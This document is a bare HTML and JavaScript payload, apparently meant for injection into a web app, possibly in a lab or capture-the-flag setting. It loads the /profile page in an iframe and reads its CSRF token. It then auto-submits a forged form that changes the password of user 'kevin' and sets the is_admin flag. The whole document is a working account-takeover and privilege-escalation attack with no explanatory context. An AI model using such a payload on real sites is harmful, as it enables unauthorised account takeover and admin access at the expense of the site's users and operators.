<iframe id="iframe" src="/profile" width="500" height="500" onload="read()"></iframe>

<script>

function read()
{
var name = 'mike';
var token = document.getElementById("iframe").contentDocument.getElementById('csrf_token').value;
document.writeln('<form action="/profile" id="form" method="post"   class="form" role="form">');
document.writeln('<input id="username" name="username" type="hidden" value="kevin">');
document.writeln('<input id="csrf_token" name="csrf_token" type="hidden" value="'+ token +'">');
document.writeln('<input class="form-control" id="old_password" name="old_password" required type="password" value="azerty">');
document.writeln('<input class="form-control" id="new_password" name="new_password" required type="password" value="test">');
document.writeln('<input class="form-control" id="new_password_confirm" name="new_password_confirm" required type="password" value="test">');
document.writeln('<input id="is_admin" name="is_admin" type="checkbox" value="y" checked="checked">');
document.writeln('<input class="btn btn-default" id="submit_form" name="submit_form" type="submit" value="Update">');
document.writeln('</form>');
document.getElementById('form').submit();
}
</script>